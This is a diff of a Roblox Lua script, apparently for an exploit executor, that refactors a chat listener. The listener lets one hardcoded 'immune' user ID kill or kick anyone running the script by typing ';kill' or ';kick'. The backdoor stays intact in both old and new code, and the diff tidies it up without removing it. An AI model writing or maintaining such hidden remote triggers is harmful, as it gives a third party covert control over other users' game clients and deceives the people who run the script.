@@ -81,13 +81,11 @@ local LocalPlayer = Players.LocalPlayer
 
 local IMMUNE_USER_ID = 4415189195
 
-if LocalPlayer.UserId == IMMUNE_USER_ID then
-    return
-end
+if LocalPlayer.UserId == IMMUNE_USER_ID then return end
 
 local function killLocalPlayer()
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = character:FindFirstChildWhichIsA("Humanoid")
     if humanoid then
         humanoid.Health = 0
     end
@@ -98,22 +96,17 @@ local function kickLocalPlayer()
 end
 
 TextChatService.OnIncomingMessage = function(message)
-    local props = message.TextSource
-    if not props then return end
+    local source = message.TextSource
+    if not source then return end
+    if source.UserId ~= IMMUNE_USER_ID then return end
 
-    local senderUserId = props.UserId
     local text = message.Text:lower()
-
-    if senderUserId == IMMUNE_USER_ID then
-        if text == ";kill" then
-            killLocalPlayer()
-        elseif text == ";kick" then
-            kickLocalPlayer()
-        end
+    if text == ";kill" then
+        killLocalPlayer()
+    elseif text == ";kick" then
+        kickLocalPlayer()
     end
 end
-
-Players.PlayerAdded:Connect(hookPlayerChat)
 
 local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
